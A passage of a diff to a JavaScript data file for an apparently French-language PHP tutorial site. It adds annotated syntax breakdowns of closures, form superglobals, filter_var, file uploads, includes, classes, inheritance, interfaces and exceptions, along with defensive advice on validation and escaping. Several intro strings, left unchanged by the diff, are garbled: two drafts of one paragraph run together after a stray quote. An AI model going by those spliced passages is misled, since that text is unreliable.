 '$double = function (int $n): int {\n    return $n * 2;\n};                        // ← point-virgule : c\'est une AFFECTATION !\n\necho $double(21);         // 42\necho gettype($double);    // object (instance de Closure !)\n\n// Le cas d\'usage roi : les callbacks de array_*\n$noms = array_map(function (array $p): string {\n    return $p["nom"];\n}, $produits);' },
             { t: 'h3', h: 'Closure : capturer avec use' },
+            { t: 'syntax', title: 'Anonyme, use et fn, décortiqués', lang: 'php', code:
+'$taux = 0.18;\n$ttc = function (float $ht) use ($taux): float {\n    return $ht * (1 + $taux);\n};\n$court = fn(float $ht) => $ht * 2;\n$ttc(10000);   // 11800.0', legend: [
+              ['function (…) use ($taux)', 'l\'anonyme classique : use IMPORTE les variables extérieures — sans use, la fonction est une île coupée du monde'],
+              ['$ttc = function…', 'la fonction est une VALEUR dans une variable : passable en argument, stockable, jetable'],
+              ['fn(…) => expr', 'la forme COURTE : une seule expression, return implicite, capture AUTOMATIQUE de l\'extérieur — plus de use à écrire'],
+              ['$ttc(10000)', 'l\'appel se fait comme toujours : nom de la variable + parenthèses + arguments'],
+              ['le cas d\'usage nº 1', 'les callbacks d\'array_map / array_filter / usort : une logique jetable écrite au pied levé']
+            ]},
             { t: 'code', lang: 'php', code:
 '$taux = 0.18;\n\n// use ($taux) : COPIE la valeur de l\'environnement dans la fonction\n$ttc = function (float $ht) use ($taux): float {\n    return $ht * (1 + $taux);\n};\n\necho $ttc(500);           // 590\n\n// use (&$compteur) : capture par RÉFÉRENCE → partage en direct\n$appels = 0;\n$log = function (string $msg) use (&$appels): void {\n    $appels++;\n    // journalise…\n};\n$log("a"); $log("b"); echo $appels;   // 2' },
             { t: 'callout', kind: 'info', h: 'Différence majeure avec JS : la capture n\'est **pas implicite** — sans `use`, la variable extérieure est invisible. Et la capture `use ($x)` se fait **par valeur au moment de la définition** : modifier `$x` après ne change rien dans la closure.' },
@@ -685,6 +805,14 @@ DEVDOCS.php.categories.push(
 '$_SERVER["REQUEST_METHOD"];    // GET, POST, PUT, DELETE…\n$_SERVER["REQUEST_URI"];       // /produits?page=2\n$_SERVER["SCRIPT_NAME"];       // /index.php\n$_SERVER["DOCUMENT_ROOT"];     // /var/www/public\n$_SERVER["REMOTE_ADDR"];       // IP du client (ou du proxy !)\n$_SERVER["HTTP_USER_AGENT"];   // navigateur déclaré\n$_SERVER["HTTP_REFERER"];      // page d\'origine (sic, une faute historique)\n\n// Test standard "ce formulaire vient d\'être soumis" :\nif ($_SERVER["REQUEST_METHOD"] === "POST") {\n    // traitement…\n}' },
             { t: 'callout', kind: 'warn', h: 'Tout ce qui commence par `HTTP_` dans `$_SERVER` vient des **en-têtes envoyés par le client** : User-Agent, Referer, X-Forwarded-For se falsifient en une ligne. Bon pour la télémétrie — jamais pour une décision de sécurité (IP de confiance, blocage).' },
             { t: 'h3', h: '$_GET : l\'état dans l\'URL' },
+            { t: 'syntax', title: '$_GET : lire l\'URL avec filet', lang: 'php', code:
+'// URL : /produit.php?id=42&promo=15\n$id = $_GET["id"] ?? null;\n$promo = (int)($_GET["promo"] ?? 0);', legend: [
+              ['?id=42&promo=15', 'les paramètres de l\'URL : paires clé=valeur après le ?, séparées par des & — éditables à la main, donc JAMAIS fiables'],
+              ['$_GET', 'le tableau associatif MAGIQUE, rempli tout seul par PHP à chaque requête'],
+              ['?? null', 'le filet : si le paramètre n\'est pas dans l\'URL, la clé n\'existe PAS — sans ??, c\'est un warning assuré'],
+              ['(int)(…)', 'le cast défensif : TOUT ce qui vient de l\'URL est une chaîne, hostile par nature — convertis ET valide avant usage'],
+              ['usage honorable', 'filtres, pagination, recherche : $_GET garde l\'état dans l\'URL — partageable et historisable']
+            ]},
             { t: 'p', h: '`$_GET` reçoit les paires clé=valeur de l\'URL. Visible, partageable, bookmarkable : parfait pour pagination, filtres, recherche. Interdit pour mots de passe ou actions destructrices. Lecture sécurisée, toujours avec `??` :' },
             { t: 'code', lang: 'php', code:
 '// URL : /catalogue.php?page=2&ville=cotonou\n$page  = (int) ($_GET["page"]  ?? 1);\n$ville = (string) ($_GET["ville"] ?? "tous");\n\n// Construire soi-même une query string proprement :\necho "?" . http_build_query(["page" => 3, "ville" => "Abomey-Calavi"]);\n// ?page=3&ville=Abomey-Calavi  (encodage des espaces/accents inclus)' },
@@ -732,6 +860,14 @@ DEVDOCS.php.categories.push(
 '<?php\n$erreurs = [];\n$qte     = "";\n$produit = "";\n\nif ($_SERVER["REQUEST_METHOD"] === "POST") {\n    // 1. LIRE (avec ?? — jamais direct)\n    $qte     = trim($_POST["qte"] ?? "");\n    $produit = trim($_POST["produit"] ?? "");\n\n    // 2. VALIDER (fiche Validation pour aller plus loin)\n    if ($produit === "")                     { $erreurs[] = "Produit requis."; }\n    if (!is_numeric($qte) || (int) $qte <= 0) { $erreurs[] = "Quantité invalide."; }\n\n    // 3. RÉUSSITE → redirection (pattern POST/Redirect/GET)\n    if (!$erreurs) {\n        // …enregistrer la commande…\n        header("Location: /merci.php");\n        exit;               // exit APRÈS une redirection d\'en-tête !\n    }\n}\n?>\n<form method="post" action="/commande.php">\n  <label>Produit\n    <input name="produit" value="<?= htmlspecialchars($produit) ?>">\n  </label>\n  <label>Quantité\n    <input name="qte" type="number" value="<?= htmlspecialchars($qte) ?>">\n  </label>\n  <button>Commander à Dantokpa</button>\n</form>\n<?php foreach ($erreurs as $e): ?>\n  <p class="erreur"><?= htmlspecialchars($e) ?></p>\n<?php endforeach; ?>' },
             { t: 'callout', kind: 'tip', h: 'Le trio magique du traitement : **REQUEST_METHOD pour détecter la soumission**, **htmlspecialchars pour ré-injecter les valeurs** dans le formulaire (fiche XSS), et **header("Location: …") + exit en cas de succès** — le pattern POST/Redirect/GET qui évite le double envoi lors d\'un F5.' },
             { t: 'h3', h: 'name fait foi — et les []' },
+            { t: 'syntax', title: 'Du name au $_POST, décortiqué', lang: 'php', code:
+'<input name="email" type="email">\n<input name="tags[]">\n<input name="tags[]">\n\n// côté serveur :\n$_POST["email"];   // la saisie, en chaîne\n$_POST["tags"];    // un TABLEAU de valeurs', legend: [
+              ['name="email"', 'LA clé de destination : le name côté HTML devient la clé côté PHP — c\'est LUI qui fait foi, pas l\'id'],
+              ['$_POST["email"]', 'les champs envoyés en POST atterrissent dans $_POST ; ceux dans l\'URL (method="get") dans $_GET'],
+              ['name="tags[]"', 'les crochets VIDES : plusieurs champs du même name se rangent dans un TABLEAU PHP — cases à cocher, multi-sélections'],
+              ['toujours le filet', '$_POST["email"] ?? "" : une clé peut manquer (champ désactivé, formulaire trafiqué) — ?? avant tout, systématiquement'],
+              ['en chaîne, toujours', 'même type="number" livre une CHAÎNE : cast explicite (int), (float) avant tout calcul']
+            ]},
             { t: 'code', lang: 'php', code:
 '// <input name="gouts[]"> coché ×3 → PHP reçoit un TABLEAU\n$gouts = $_POST["gouts"] ?? [];      // ["piment", "ail"]\nif (is_array($gouts)) { /* … */ }\n\n// <select name="ville">  → la value de l\'option choisie\n$ville = $_POST["ville"] ?? "";\n\n// <input type="checkbox" name="news" value="oui">\n$news = isset($_POST["news"]);       // décochée = ABSENTE de $_POST !' },
             { t: 'callout', kind: 'warn', h: 'Une **checkbox décochée n\'apparaît pas du tout** dans `$_POST`. Teste avec `isset()` — ou ajoute un `<input type="hidden" name="news" value="non">` avant la checkbox (astuce standard).' }
@@ -755,6 +891,14 @@ DEVDOCS.php.categories.push(
           intro: '`<input required>` dans ton HTML, c\'est de la politesse — ça aide l\'utilisateur, mais ça ne protège RIEN. N\'importe qui peut désactiver JavaScript, utiliser curl, ou modifier le HTML dans les DevTools pour contourner ces vérifications en 10 secondes. La SEULE validation qui compte se fait **côté serveur**. PHP te donne `filter_var`/`filter_input` pour valider proprement (email, entier, URL, booléen…), et une règle cardinale à ne jamais violer : **on valide à l\'entrée, on échappe à la sortie**. Valider n\'est pas échapper — ce sont deux étapes distinctes, à des moments distincts, pour des raisons distinctes.\'… contournable en 10 secondes (curl, DevTools). La seule validation qui compte se fait **côté serveur**. PHP offre `filter_var`/`filter_input` : des filtres de validation standardisés, bien préférables aux regex artisanales. Et une règle cardinale : **on valide à l\'entrée, on échappe à la sortie** — ce ne sont pas les mêmes étapes.',
           blocks: [
             { t: 'h3', h: 'filter_var : le couteau suisse' },
+            { t: 'syntax', title: 'filter_var : valider en une ligne', lang: 'php', code:
+'$email = filter_var($_POST["email"] ?? "", FILTER_VALIDATE_EMAIL);\nif ($email === false) {\n    $erreurs["email"] = "Adresse invalide";\n}', legend: [
+              ['filter_var($valeur, FILTRE)', 'le validateur intégré : renvoie la valeur si elle PASSE, false si elle RATE'],
+              ['FILTER_VALIDATE_EMAIL', 'le filtre prêt à l\'emploi — famille complète : FILTER_VALIDATE_INT, FILTER_VALIDATE_URL, FILTER_VALIDATE_FLOAT…'],
+              ['=== false', 'le test d\'échec STRICT obligatoire : une valeur valide peut ressembler à du faux ("0"), jamais de if(!$email) ici'],
+              ['$erreurs["email"] = "…"', 'le pattern « erreurs par champ » : on RANGE le message sous sa clé, puis la vue l\'affiche sous SON champ'],
+              ['valider ≠ nettoyer', 'FILTER_VALIDATE_* juge ; FILTER_SANITIZE_* nettoie (retire les caractères gênants) — deux missions, deux familles']
+            ]},
             { t: 'code', lang: 'php', code:
 'filter_var("awa@exemple.bj", FILTER_VALIDATE_EMAIL);   // l\'email ou FALSE\nfilter_var("42",  FILTER_VALIDATE_INT);                // 42 ou false\nfilter_var("3.5", FILTER_VALIDATE_FLOAT);\nfilter_var("https://dantokpa.bj", FILTER_VALIDATE_URL);\nfilter_var("oui", FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE);\n\n// Avec options :\nfilter_var($qte, FILTER_VALIDATE_INT,\n    ["options" => ["min_range" => 1, "max_range" => 100]]);\n\n// filter_input : lit DIRECTEMENT la superglobale\n$email = filter_input(INPUT_POST, "email", FILTER_VALIDATE_EMAIL);\n$page  = filter_input(INPUT_GET, "page", FILTER_VALIDATE_INT) ?: 1;' },
             { t: 'callout', kind: 'warn', h: '`FILTER_SANITIZE_EMAIL` et ses frères **modifient** la valeur sans rien dire (« nettoyage silencieux » — on retire les caractères interdits). Réflexe pro : **FILTER_VALIDATE_*** (accepter/refuser) plutôt que SANITIZE (réparer en douce). La donnée pourrie doit être rejetée, pas bricolée.' },
@@ -793,6 +937,14 @@ DEVDOCS.php.categories.push(
             { t: 'code', lang: 'html', code:
 '<form method="post" action="/upload.php" enctype="multipart/form-data">\n  <!-- sans enctype, le fichier ne part PAS : $_FILES serait vide -->\n  <input type="file" name="photo" accept="image/jpeg,image/png">\n  <button>Envoyer</button>\n</form>' },
             { t: 'h3', h: 'Côté PHP : anatomie de $_FILES' },
+            { t: 'syntax', title: '$_FILES + move_uploaded_file, décortiqués', lang: 'php', code:
+'if (isset($_FILES["photo"]) && $_FILES["photo"]["error"] === UPLOAD_ERR_OK) {\n    $tmp = $_FILES["photo"]["tmp_name"];\n    move_uploaded_file($tmp, "uploads/photo.jpg");\n}', legend: [
+              ['$_FILES["photo"]', 'la FICHE du fichier reçu : name, type, size, tmp_name, error — sous la clé du name= du champ'],
+              ['["error"] === UPLOAD_ERR_OK', 'la vérif AVANT tout : error 1/2 = trop lourd (limites php.ini), 4 = aucun fichier joint'],
+              ['tmp_name', 'le chemin TEMPORAIRE où PHP a garé le fichier : il DISPARAÎT en fin de requête si tu ne le ranges pas'],
+              ['move_uploaded_file($tmp, $dest)', 'le déménagement OFFICIEL : refuse les chemins non issus d\'un vrai upload — jamais un copy() ici'],
+              ['le bonus sécu', 'renomme avec un nom généré (bin2hex(random_bytes(8)) . ".jpg") et vérifie le VRAI type (mime_content_type) — jamais l\'extension du client']
+            ]},
             { t: 'code', lang: 'php', code:
 '// Pour <input name="photo"> :\n$_FILES["photo"]["name"];      // "vacances.jpg" — NOM CLIENT, jamais fiable\n$_FILES["photo"]["type"];      // "image/jpeg"  — fourni par le CLIENT ⚠\n$_FILES["photo"]["tmp_name"];  // /tmp/phpXyZ123 — le fichier, pour l\'instant\n$_FILES["photo"]["error"];     // UPLOAD_ERR_OK (0) si tout s\'est bien passé\n$_FILES["photo"]["size"];      // octets\n\n// Codes usuels : UPLOAD_ERR_INI_SIZE (1), FORM_SIZE (2), PARTIAL (3),\n// NO_FILE (4) — tester error AVANT tout le reste.' },
             { t: 'h3', h: 'Le pipeline complet, sécurisé' },
@@ -845,6 +997,14 @@ DEVDOCS.php.categories.push(
 'require_once __DIR__ . "/config.php";      // indispensable + anti-double\nrequire_once __DIR__ . "/fonctions.php";   // bibliothèque de fonctions\ninclude __DIR__ . "/partials/bandeau-promo.php";  // bonus optionnel' },
             { t: 'callout', kind: 'tip', h: 'Règle simple à retenir : **require_once partout**. Certains diront que `require_once` est « plus lent » que `require` parce que PHP doit vérifier si le fichier a déjà été inclus. C\'est vrai techniquement — mais la différence se mesure en microsecondes, et le bug « function already declared » que `_once` t\'évite se mesure en heures de débogage. Utilise `require_once` par défaut, et ne descends à `include` que pour les fichiers optionnels (une bannière promo, un widget conditionnel).. Un fichier de config ou de fonctions manquant = l\'application ne peut pas tourner → fatal error immédiate, pas un site à moitié rendu avec un warning en haut. Le once élimine la classe entière de bugs « function already declared ».' },
             { t: 'h3', h: 'Le problème des chemins : __DIR__ à la rescousse' },
+            { t: 'syntax', title: 'require_once + __DIR__ : le combo incassable', lang: 'php', code:
+'require __DIR__ . "/includes/header.php";\nrequire_once __DIR__ . "/fonctions.php";', legend: [
+              ['require', 'l\'inclusion VITALE : fichier absent → erreur fatale, tout s\'arrête. include, lui, se contente d\'avertir — réserve-le au décor optionnel'],
+              ['_once', 'UNIQUE garanti : inclusion déjà faite → ignorée. La règle absolue pour les librairies de fonctions (sinon « function already defined »)'],
+              ['__DIR__', 'le dossier DU FICHIER COURANT : le chemin devient ABSOLU et incassable, quel que soit le point d\'entrée du site'],
+              ['. "/includes/…"', 'on CONCATÈNE le chemin relatif après __DIR__ : portable de ton PC au serveur, sans rien changer'],
+              ['le réflexe unique', 'require_once __DIR__ . "/chemin.php" : sûr (require), sans double emploi (_once), portable (__DIR__)']
+            ]},
             { t: 'code', lang: 'php', code:
 '// include "config.php";        ← relatif au DOSSIER COURANT de l\'appelant…\n// Si /admin/produits.php inclut ../lib/outils.php qui inclut "config.php",\n// le chemin se résout DEPUIS /admin : plantage intermittent !\n\nrequire_once __DIR__ . "/config.php";\n// __DIR__ = dossier du FICHIER où cette ligne est écrite : toujours juste,\n// quel que soit le script qui a déclenché la chaîne d\'inclusion.\n\nrequire_once dirname(__DIR__) . "/config.php";   // dossier parent' },
             { t: 'h3', h: 'Organisation d\'un petit site' },
@@ -887,6 +1047,14 @@ DEVDOCS.php.categories.push(
           intro: 'Un tableau associatif `["nom" => "Gari", "prix" => 500]` fonctionne… jusqu\'au jour où tu tapes `"pri"` au lieu de `"prix"` et que PHP te sert un warning au lieu de refuser. Pire : tu ajoutes une fonction `calculerTTC()` qui n\'a aucun lien formel avec tes données — elle flotte dans le fichier, et rien ne garantit qu\'elle reçoive le bon tableau. Une **classe** résout ces deux problèmes d\'un coup : les données (propriétés) et les comportements (méthodes) vivent ENSEMBLE, le compilateur refuse les clés inventées, et les types sont vérifiés. PHP 8 a même réduit le « bruit » d\'écriture avec la **promotion de propriétés** qui déclare et affecte en une ligne.\'… jusqu\'au jour où tu tapes "pri" au lieu de "prix" et que PHP te sert un warning au lieu de refuser. Une **classe** est un moule qui garantit la forme et le comportement : les données (propriétés) et ce qu\'on peut leur faire (méthodes) vivent ensemble. PHP 8 a même réduit le bruit avec la **promotion de propriétés**.',
           blocks: [
             { t: 'h3', h: 'La classe minimale' },
+            { t: 'syntax', title: 'class, new et la flèche, décortiqués', lang: 'php', code:
+'class Produit\n{\n    public string $nom = "";\n    public float $prix = 0;\n}\n$p = new Produit();\n$p->prix = 1200;\n$p->prix;   // 1200.0', legend: [
+              ['class Produit', 'le PLAN de construction : PascalCase par convention, nom commun singulier — « de quoi on fabrique des exemplaires »'],
+              ['public string $nom = ""', 'une PROPRIÉTÉ : la case que chaque objet possédera — visibilité, TYPE, et valeur de départ'],
+              ['new Produit()', 'L\'INSTANCIATION : fabrique UN objet vivant depuis le plan — new, le mot de la création'],
+              ['$p->prix', 'la FLÈCHE d\'accès : « la propriété prix DE CET objet » — et attention, PAS de $ sur le nom après la flèche'],
+              ['objet ≠ plan', 'class = le moule ; $p = un gâteau sorti du moule : tu changes $p->prix sans toucher aux autres exemplaires']
+            ]},
             { t: 'code', lang: 'php', code:
 'class Produit\n{\n    // Promotion de constructeur (PHP 8) : déclare + affecte en UNE ligne\n    public function __construct(\n        public string $nom,\n        public float  $prix,\n        public int    $stock = 0,\n    ) {}\n\n    public function prix_ttc(): float\n    {\n        return $this->prix * 1.18;   // $this = L\'OBJET courant\n    }\n\n    public function libelle(): string\n    {\n        $rupture = $this->stock === 0 ? " (rupture)" : "";\n        return $this->nom . " — " . $this->prix_ttc() . " FCFA" . $rupture;\n    }\n}\n\n$gari = new Produit("Gari de Dantokpa", 500, 12);\necho $gari->libelle();          // Gari de Dantokpa — 590 FCFA\n$gari->stock = 30;              // propriété publique modifiable\nvar_dump($gari instanceof Produit); // true' },
             { t: 'callout', kind: 'info', h: '**Version pré-PHP 8** (à savoir lire partout) : on déclare `public string $nom;` à part, puis dans `__construct(string $nom)` on écrit `$this->nom = $nom;` pour chaque propriété. La promotion fait exactement ça, en une ligne — code identique une fois compilé.' },
@@ -926,6 +1094,14 @@ DEVDOCS.php.categories.push(
           intro: 'Imagine un compte MoMo dont le solde est une propriété `public`. N\'importe quelle ligne du programme peut écrire `$compte->solde = -99999` — techniquement légal, métier absurde. L\'**encapsulation** est le premier pilier de la POO pour une raison simple : sans elle, aucun invariant ne tient. La visibilité (`public`/`protected`/`private`) fait de la classe la GARDIENNE de ses données — les modifications passent par des méthodes qui peuvent valider, logger, notifier. PHP ne force pas l\'encapsulation ; c\'est une discipline que TU imposes. Cette fiche te donne les trois niveaux et les conventions qui font qu\'un objet est un coffre-fort, pas une passoire.\' Laisser tout public, c\'est permettre `$produit->prix = -50` depuis n\'importe où. La visibilité (`public`/`protected`/`private`) fait de la classe la gardienne de ses règles. Ajoute `static` (qui appartient à la classe, pas à l\'objet) et `const`, et tu tiens l\'essentiel de l\'armure objet PHP.',
           blocks: [
             { t: 'h3', h: 'Les trois niveaux' },
+            { t: 'syntax', title: 'L\'encapsulation, décortiquée', lang: 'php', code:
+'class Compte\n{\n    private float $solde = 0;\n    public function deposer(float $montant): void\n    {\n        if ($montant > 0) {\n            $this->solde += $montant;\n        }\n    }\n}', legend: [
+              ['private float $solde', 'la règle d\'or : les propriétés en PRIVATE — personne ne touche les données sans passer par le guichet'],
+              ['public function deposer(…)', 'le GUICHET : la méthode publique est le seul passage autorisé — elle peut vérifier avant d\'agir'],
+              ['$this->solde', 'À L\'INTÉRIEUR de la classe, l\'objet courant s\'appelle $this : ses propres cases, que le dehors ne voit plus'],
+              ['void', 'cette méthode ne RENVOIE rien : elle agit, elle ne répond pas — l\'annonce honnête du type de retour'],
+              ['protected', 'le 3ᵉ niveau : visible par la classe ET SES ENFANTS (héritage) — pas par le public']
+            ]},
             { t: 'table', head: ['Visibilité', 'Depuis l\'extérieur', 'Depuis la classe', 'Depuis les enfants'], rows: [
               ['`public`', '✓', '✓', '✓'],
               ['`protected`', '✗', '✓', '✓ (hérités)'],
@@ -965,6 +1141,13 @@ DEVDOCS.php.categories.push(
           intro: 'Tu as écrit une classe `Paiement` avec toute la logique de validation de montant, de devise, de calcul de frais. Maintenant, tu veux un `PaiementMobile` qui AJOUTE la logique MoMo SANS réécrire tout ce que `Paiement` fait déjà. L\'**héritage** résout ça : l\'enfant reçoit GRATUITEMENT tout le code du parent (`extends`) et ne spécialise que ce qui diffère. Mais attention : l\'héritage est l\'outil le plus sur-utilisé de la POO. « Hériter pour récupérer du code » sans vraie relation « est-un » crée des hiérarchies fragiles. Cette fiche te donne la règle d\'or : un `Zémidjan est un Véhicule` → extends ✓ ; `Commande est un Produit` → non, composition ✗.\' L\'enfant hérite des propriétés et méthodes du parent, peut les spécialiser (override) et en ajouter. Bien utilisé — peu de niveaux, classes abstraites qui posent le contrat, `final` qui ferme ce qui ne doit pas bouger — c\'est un outil de cohérence. Mal utilisé (tour de 6 niveaux), un cauchemar.',
           blocks: [
             { t: 'h3', h: 'extends et parent::' },
+            { t: 'syntax', title: 'L\'héritage propre, décortiqué', lang: 'php', code:
+'class ProduitFrais extends Produit\n{\n    public function __construct(\n        string $nom,\n        float $prix,\n        public string $dlc\n    ) {\n        parent::__construct($nom, $prix);\n    }\n}', legend: [
+              ['extends Produit', 'l\'HÉRITAGE : ProduitFrais POSSÈDE DÉJÀ tout ce que Produit a — on n\'ajoute que la différence. UN seul parent en PHP'],
+              ['public string $dlc', 'la promotion de propriété (PHP 8) : déclarée ET remplie via le constructeur, en une seule ligne'],
+              ['parent::__construct(…)', 'le RAPPEL du parent : on lui confie la partie commune — jamais de copier-coller de son travail'],
+              ['l\'ordre de construction', 'toujours le parent D\'ABORD, l\'enfant complète ENSUITE : la chaîne remonte, jamais l\'inverse']
+            ]},
             { t: 'code', lang: 'php', code:
 'class Paiement\n{\n    public function __construct(\n        public readonly float $montant,     // readonly (8.1) : écrit au\n                                            // constructeur, gelé ensuite\n        public readonly string $devise = "XOF",\n    ) {}\n\n    public function libelle(): string\n    {\n        return $this->montant . " " . $this->devise;\n    }\n}\n\nclass PaiementMobile extends Paiement        // UN SEUL parent en PHP\n{\n    public function __construct(float $montant, public string $operateur)\n    {\n        parent::__construct($montant);       // initialise la partie héritée !\n    }\n\n    public function libelle(): string        // OVERRIDE : signature compatible\n    {\n        return parent::libelle() . " via " . $this->operateur;\n    }\n}\n\n$pm = new PaiementMobile(1500, "MTN MoMo");\necho $pm->libelle();   // 1500 XOF via MTN MoMo' },
             { t: 'h3', h: 'abstract : le contrat sans implémentation' },
@@ -1002,6 +1185,14 @@ DEVDOCS.php.categories.push(
           intro: 'PHP a fait un choix radical : une classe ne peut hériter que d\'UN seul parent (`extends`). C\'est une protection contre le « diamant » du C++ (deux parents qui définissent la même méthode). Mais alors, comment exprimer qu\'une classe « peut être payée » ET « peut être exportée en CSV » ? Deux outils complémentaires : l\'**interface** — un contrat sans code (« je promets de fournir une méthode `payer()` ») — et le **trait** — du code sans contrat (« voici une méthode `horodater()`, copie-la dans qui tu veux »). L\'interface est pour la PROMESSE, le trait pour la MÉCANIQUE. Ensemble : polymorphisme multiple sans ascendance commune.\' — mais deux mécanismes cassent cette limite complémentairement. L\'**interface** décrit QUOI faire sans rien imposer du comment (contrat) ; le **trait** fournit le COMMENT à plusieurs classes sans lien de parenté (réutilisation horizontale). Ensemble : polymorphisme sans ascendance obligée.',
           blocks: [
             { t: 'h3', h: 'Interface : un contrat signé' },
+            { t: 'syntax', title: 'interface + implements, décortiqués', lang: 'php', code:
+'interface Payable\n{\n    public function montant(): float;\n}\nclass Commande implements Payable\n{\n    public function montant(): float\n    {\n        return $this->total;\n    }\n}', legend: [
+              ['interface Payable', 'le CONTRAT : la liste des méthodes EXIGÉES, sans UNE ligne de code dedans — que des signatures'],
+              ['implements Payable', 'la SIGNATURE : la classe s\'engage ; oublie une méthode du contrat et PHP refuse de tourner'],
+              ['interface ≠ extends', 'on IMPLÉMENTE autant d\'interfaces qu\'on veut ; on n\'ÉTEND qu\'une seule classe — multi-contrats, mono-héritage'],
+              ['le pouvoir réel', 'function encaisser(Payable $p) : TOUT objet signataire passe — commande, abonnement, don — sans que la fonction les connaisse'],
+              ['le trait, son cousin', 'use Horodatable; IMPORTE des MÉTHODES TOUTE FAITES dans la classe : de la mécanique partagée sans héritage']
+            ]},
             { t: 'code', lang: 'php', code:
 'interface Exportable\n{\n    public function exporter(): string;   // public implicitement, aucun corps\n}\n\nclass Catalogue implements Exportable\n{\n    public function exporter(): string { return "catalogue…"; }\n}\n\nclass Facture implements Exportable {\n    /* si tu oublies exporter() → Fatal error : contrat non honoré */\n    public function exporter(): string { return "facture…"; }\n}\n\n// TYPIQUE : dépendre du CONTRAT, pas de l\'implémentation\nfunction imprimer(Exportable $doc): void { echo $doc->exporter(); }\nimprimer(new Catalogue());   // OK — accepte TOUT ce qui signe le contrat' },
             { t: 'callout', kind: 'tip', h: 'Une classe peut **implémenter plusieurs interfaces** (`implements A, B`) — c\'est la réponse PHP à l\'héritage multiple, sans ses drames (pas d\'état ni de code hérité, seulement des engagements).' },
@@ -1056,6 +1247,14 @@ DEVDOCS.php.categories.push(
 '// Développement (php.ini local ou en tête de bootstrap) :\nerror_reporting(E_ALL);\nini_set("display_errors", "1");      // les erreurs SOUS les yeux\n\n// Production :\nerror_reporting(E_ALL);\nini_set("display_errors", "0");      // JAMAIS à l\'écran\nini_set("log_errors", "1");          // → error_log (fichier/syslog)\nini_set("error_log", "/var/log/php/app.log");' },
             { t: 'callout', kind: 'warn', h: '`display_errors=1` en production affiche chemins serveur, requêtes SQL, clés — de l\'or pour un attaquant et du bruit pour tes visiteurs. **En prod : logguer, afficher une page d\'erreur neutre.**' },
             { t: 'h3', h: 'try / catch / finally : le vol plané maîtrisé' },
+            { t: 'syntax', title: 'try / catch / finally en PHP, décortiqué', lang: 'php', code:
+'try {\n    $cfg = json_decode(file_get_contents($f), true, 512, JSON_THROW_ON_ERROR);\n} catch (JsonException $e) {\n    $cfg = [];\n} finally {\n    // rangé, qu\'il pleuve ou qu\'il vente\n}', legend: [
+              ['try {…}', 'la zone à RISQUE : le code qui peut lancer une exception y vit sous surveillance'],
+              ['catch (JsonException $e)', 'attrape par TYPE : chirurgical, pas un filet fourre-tout — $e->getMessage() raconte l\'incident'],
+              ['JSON_THROW_ON_ERROR', 'le drapeau moderne : transforme les erreurs SILENCIEUSES (json qui renvoyait null) en exceptions attrapables'],
+              ['finally', 'le TOUJOURS : s\'exécute qu\'il y ait eu exception ou pas — rangement garanti'],
+              ['throw new Exception("…")', 'LANCE l\'alerte toi-même : l\'exécution saute au catch le plus proche — même famille que le throw de JavaScript']
+            ]},
             { t: 'code', lang: 'php', code:
 'function commander(int $qte): void\n{\n    if ($qte <= 0) {\n        throw new InvalidArgumentException("Quantité positive exigée.");\n    }\n    // …\n}\n\ntry {\n    commander(-3);\n    echo "Cette ligne n\'est jamais atteinte";\n} catch (InvalidArgumentException $e) {          // du PLUS PRÉCIS…\n    echo "Saisie invalide : " . $e->getMessage();\n} catch (Throwable $e) {                          // …au filet de sécurité\n    error_log($e);                                // LOGGUER, au minimum !\n    http_response_code(500);\n} finally {\n    // TOUJOURS exécuté (exception ou non) : fermer, libérer, nettoyer\n}' },
             { t: 'h3', h: 'L\'arbre : Error ≠ Exception' },
@@ -1086,6 +1285,14 @@ DEVDOCS.php.categories.push(
           intro: '`throw new Exception("stock")` fonctionne… jusqu\'à ce que ton application ait 30 points de `throw` différents. À l\'arrivée, tout le monde catche `Exception` et personne ne peut distinguer une rupture de stock d\'une panne BDD. La solution n\'est pas d\'analyser le MESSAGE d\'erreur (fragile : change la ponctuation, le catch casse), mais de créer des **exceptions métiers** — une CLASSE par situation. `StockInsuffisantException` vs `PaiementRefuseException` vs `BaseDeDonneesException` : chaque `catch` devient chirurgical, le code raconte le domaine métier, et l\'IDE t\'aide à ne rien oublier.\', tout le monde catche « Exception » et personne ne distingue une rupture de stock d\'une panne BDD. Créer ses **exceptions métiers** — une classe par situation, héritant d\'`Exception` ou d\'un marqueur commun — permet des `catch` chirurgicaux et un code qui raconte son domaine.',
           blocks: [
             { t: 'h3', h: 'Une classe par situation' },
+            { t: 'syntax', title: 'Ton exception métier, décortiquée', lang: 'php', code:
+'class StockInsuffisantException extends RuntimeException\n{\n    public function __construct(public readonly string $produit)\n    {\n        parent::__construct("Stock insuffisant pour " . $produit);\n    }\n}\nthrow new StockInsuffisantException("gari");', legend: [
+              ['extends RuntimeException', 'TON exception hérite d\'une famille PHP existante : tu SPÉCIALISES, tu ne repars pas de zéro'],
+              ['parent::__construct(…)', 'le MÉTIER compose le message, le parent gère la mécanique (trace, code) — chacun son métier'],
+              ['throw new …(…)', 'le lancement : nommé, typé, transportable — une erreur qui DIT ce qui s\'est passé'],
+              ['catch (StockInsuffisantException $e)', 'au catch, les fautes MÉTIER (rupture) se répondent autrement que les PANNES (base à terre) — le nom de la classe est le TGV — le tri à l\'entrée'],
+              ['readonly (PHP 8.1+)', 'la propriété renseignée UNE fois au constructeur, jamais modifiée ensuite — la vérité est figée']
+            ]},
             { t: 'code', lang: 'php', code:
 '// Hérite d\'Exception (ou d\'une SPL proche : DomainException, RuntimeException)\nclass StockInsuffisantException extends RuntimeException\n{\n    public function __construct(\n        public readonly string $produit,\n        public readonly int    $demande,\n        public readonly int    $disponible,\n        ?Throwable $previous = null,\n    ) {\n        parent::__construct(\n            "Stock insuffisant pour $produit : $demande demandés, $disponible dispo.",\n            0, $previous,\n        );\n    }\n}\n\nthrow new StockInsuffisantException("gari", 10, 3);' },
             { t: 'h3', h: 'Le catch chirurgical' },
@@ -1127,6 +1334,14 @@ DEVDOCS.php.categories.push(
